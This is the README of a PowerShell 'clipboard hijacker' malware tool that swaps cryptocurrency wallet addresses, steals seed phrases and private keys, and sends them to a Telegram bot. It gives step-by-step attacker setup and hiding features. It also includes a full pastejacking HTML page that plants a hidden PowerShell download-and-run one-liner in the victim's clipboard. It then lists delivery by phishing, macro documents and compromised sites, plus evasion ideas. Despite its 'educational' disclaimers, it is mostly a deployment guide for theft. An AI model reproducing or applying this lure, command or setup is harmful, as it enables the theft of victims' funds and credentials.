# Clipboard-Hijacker Payload (2026 Edition)

**Important Legal Notice**  
This tool is provided **strictly for educational, research, and authorized penetration testing purposes**.  
Any unauthorized use, including but not limited to real-world malicious deployment, cryptocurrency theft, data exfiltration without consent, or violation of laws is **strictly prohibited** and may result in severe criminal penalties.  
The author(s) and contributors accept **no responsibility** for misuse.

## Overview & Objectives

The Clipboard-Hijacker Payload is a **modernized, feature-rich post-exploitation tool** written in PowerShell, designed to demonstrate clipboard monitoring and manipulation techniques.

**Core Capabilities (2026 updates):**
- Real-time clipboard monitoring with human-like random jitter (320–720 ms intervals)
- Detection & replacement of cryptocurrency wallet addresses across 15+ major blockchains
- Prioritized replacement for stablecoins (USDC first) and Lightning Network invoices (BOLT-11)
- Whitelist protection (never replaces attacker's own addresses)
- Selective skipping of dangerous content (URLs, seed phrases, private keys) during replacement — but still extracts them
- Stealth features: hidden console, minimal disk footprint, random timing
- Exfiltration via **Telegram Bot API** (HTTPS encrypted, serverless, instant notifications)
- Local logging only on successful replacements (disguised path)

**Compared to the original 2020–2022 version:**
- Polling interval: fixed 10 seconds → ~0.5 seconds average with jitter
- Exfil: plain HTTP POST form data → encrypted HTTPS to Telegram
- Features: basic steal → active address swapping + multi-chain + Lightning + whitelist
- Stealth: visible console + obvious logging → hidden + minimal footprint
- Delivery: manual execution → designed for pastejacking / one-liner / maldoc

## Features in Detail (2026)

- **Supported Blockchains** (with regex & random rotation):
  - Bitcoin Legacy & SegWit
  - Ethereum + EVM-compatible (USDC priority)
  - BSC/BEP20, Polygon, Base, Avalanche C-Chain
  - TRON, Solana, Cardano, XRP, DOGE, LTC, Monero, TON

- **Lightning Network**: Detects BOLT-11 invoices & replaces with your preloaded ones

- **Intelligent Behavior**:
  - Always exfiltrates everything (including seeds/privkeys/URLs)
  - Replaces only crypto addresses/invoices (skips if already yours)
  - Flags dangerous content for awareness

- **Stealth & Anti-Detection**:
  - Hidden window via WinAPI
  - Random sleep jitter
  - Logging only on replacement (to `%APPDATA%\SysCache\clip.log`)
  - No constant disk writes

## Requirements

**Victim Side (Windows)**
- Windows 10/11 (PowerShell 5.1+ — default)
- Internet access (for Telegram exfil)

**Attacker Side**
- Telegram account
- Telegram bot (created via @BotFather)
- Private channel/group with bot as admin

## Installation & Setup (Attacker Side) - Detailed Step-by-Step

1. **Create a Telegram Bot**:
   - Open the Telegram app on your phone, desktop, or web (telegram.org).
   - Search for `@BotFather` (official Telegram bot for creating bots).
   - Start a chat with @BotFather and send the command: `/newbot`.
   - Follow the prompts: Provide a name for your bot (e.g., "MyClipperBot") and a username ending with "bot" (e.g., "my_clipper_bot").
   - @BotFather will provide your bot's API token (e.g., `8000000000:AAGRDjUqixqTmYIAKHD9_hbLCED6OzyQEpo`). Copy this token — keep it secret.

2. **Set Up a Private Channel or Group**:
   - In Telegram, create a new private channel (Menu > New Channel > Set as private) or group (Menu > New Group).
   - Add your bot as an administrator: Go to channel/group settings > Administrators > Add Administrator > Search for your bot's username > Grant "Post Messages" permission.
   - Send a test message in the channel/group (e.g., "Test exfil").

3. **Obtain the Chat ID**:
   - In a browser, paste this URL (replace `YOUR_TOKEN_HERE` with your real bot token):
     ```
     https://api.telegram.org/botYOUR_TOKEN_HERE/getUpdates
     ```
   - Press Enter — you'll see a JSON response.
   - Look for `"chat":{"id":-1001987654321,...}` (the ID is usually negative for channels/groups). Copy the `id` value (e.g., `-1001987654321` or `5000000000`).
   - If empty (`"result": []`), send another test message in the channel/group and refresh the URL.

4. **Configure the PowerShell Script**:
   - Open `clipboardhijacker.ps1` in a text editor (e.g., Notepad, VS Code).
   - Find the line: `$telegram_base = "https://api.telegram.org/botYOUR_BOT_TOKEN_HERE/sendMessage?chat_id=YOUR_CHAT_ID_HERE&text="`
   - Replace `YOUR_BOT_TOKEN_HERE` with your bot token and `YOUR_CHAT_ID_HERE` with your chat ID (no extra quotes inside the string).
   - Optionally, update `$wallets` with your real cryptocurrency addresses (comma-separated for rotation).
   - Save the file.

5. **Host the Script for Download**:
   - Upload `clipboardhijacker.ps1` to a raw-hosting site (e.g., GitHub Gist, pastes.io with "Plaintext" syntax and "Never" expiration).
   - Copy the raw URL (e.g., `https://gist.githubusercontent.com/yourusername/xxxxxxxxxxxxxxxx/raw/clipboardhijacker.ps1`).

## How to Use / Deploy - Detailed Step-by-Step

### Local Testing (Safe VM Recommended)
1. Open PowerShell on your test Windows machine.
2. Navigate to the script folder: `cd Path\To\Your\Script\Folder`
3. Run: `powershell -ExecutionPolicy Bypass -File .\clipboardhijacker.ps1`
4. Copy a test string (e.g., a fake BTC address) to clipboard.
5. Check your Telegram channel/group for the exfil message.

### Real Deployment Methods (Educational Only)
Modern campaigns (2025–2026) use **automated delivery**:

1. **Pastejacking / Fake Verification Page** (Most Common):
   - Create a simple HTML file with JavaScript that overwrites clipboard on copy.
   - Example HTML (save as `fake_verification.html`):
     ```html
     <!DOCTYPE html>
     <html>
     <head>
       <title>Verification Required</title>
     </head>
     <body>
       <p>Copy this code and paste into Windows Run (Win+R) to continue:</p>
       <textarea id="code">verification-code-123</textarea>
       <button onclick="copyCode()">Copy Code</button>
       <script>
         function copyCode() {
           const textarea = document.getElementById('code');
           textarea.select();
           document.execCommand('copy');
           // Overwrite with real one-liner
           navigator.clipboard.writeText('powershell -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'YOUR_RAW_SCRIPT_URL_HERE\')"');
         }
       </script>
     </body>
     </html>
     ```
   - Replace `YOUR_RAW_SCRIPT_URL_HERE` with your hosted PS1 raw URL.
   - Host the HTML on a free site (e.g., GitHub Pages, Netlify) or VPS.
   - Lure victim to the page via phishing link.
   - Victim copies → pastes into Win+R → script downloads and runs.

2. **Other Vectors**:
   - **Maldocs**: Embed the one-liner in a Word/Excel macro.
   - **Scams**: Tell victim in Discord/Telegram: "Copy this fix command and paste in Run."
   - **Drive-by**: Inject into compromised sites.

## Detection & Evasion Notes

- **High detection risk** on modern Windows 11 + Defender (AMSI, behavioral rules)
- **Real-world improvements** (not implemented here):
  - Obfuscation / AMSI bypass
  - Compile to EXE (Go/Rust/C#)
  - Use loaders/dropper
  - String encryption
  - Anti-VM/sandbox checks

## Disclaimer & Ethics

This code is **for authorized red-team, ethical hacking, and research only**.  
Misuse may violate multiple laws (computer fraud, wire fraud, theft, etc.).  
Use only on systems you own or have explicit written permission to test.

**Last Updated:** January 11, 2026  
**Version:** 2026 Modern Edition (Telegram Exfil + Multi-Chain Clipper)  
**Original Author:** techchipnet (classic version)  

**Modernized Concept:** Community evolution (educational purposes)

